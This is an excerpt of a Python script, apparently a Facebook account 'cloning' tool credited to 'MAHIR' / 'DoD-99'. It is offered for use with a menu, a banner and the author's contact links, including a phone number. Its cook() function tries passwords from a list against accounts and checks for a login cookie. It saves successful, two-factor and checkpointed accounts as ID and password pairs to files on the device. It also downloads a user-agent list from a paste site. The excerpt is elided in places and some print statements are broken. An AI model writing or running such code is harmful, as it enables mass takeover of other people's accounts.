...
for xd in range(10000):
    ...
    ugen.append(uaku2)
try:
    os.system('curl https://justpaste.it/52guv -o ua.html')
except:
    pass
...
def uaku():
    try:
        ...
        a=requests.get('https://justpaste.it/52guv').text
...
\033[1;37m======================== \33[1;97mMAHIR\33[1;37m ========================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mMAHIR\33[0;m \033[1;33m TAHSAN\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m TOXIC.UP
\033[1;32m     \033[1;35mGITHUB       :  \033[1;37mDoD-99
\033[1;32m     \033[1;91mWHATSAPP     :  \033[1;35m013146***49
...
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mDOD-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mDOD-CP.txt' %
              (H, P, str(len(cp))))
...
def xyz():
    ...
    print(f"{BLUE}══════════════════════════════════════════════════════")
    print(f"{RED}[01] {WHITE}START CLONE RANDOM BD IDZ")
    print(f"{RED}[02] {WHITE}OWNER GITHUB")
    ...
    mahi = input("[√] CHOOSE : ")
    if mahi in ["1","01"]:
        os.system("xdg-open https://github.com/DoD-99")
        time.sleep(4)
        cook()
    elif mahi in ["2","02"]:
        os.system("xdg-open https://github.com/DoD-99");xyz()  
    elif mahi in ["3","03"]:
        os.system("xdg-open https://www.facebook.com/toxic.up");xyz()
    elif mahi in ["4","04"]:
        os.system("xdg-open https://wa.me/+8801314629049")
        xyz()    
    elif mahi in ["0","00"]:
       exit()
    else:
...
def cook():
    ...
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[1;35mEXAMPLE :👇\033[0;m]")
    print(f"")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\r\033[1;32m[DOD-OK] '+uid+' [✓] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/DOD-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[DOD-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/DOD-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;91m[DOD-CP] '+uid+' [✓] '+ps+ ' ')
                    open('/sdcard/DOD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;94m[DOD] [%s] \33[1;92m[OK:%s] \033[1;91m [CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
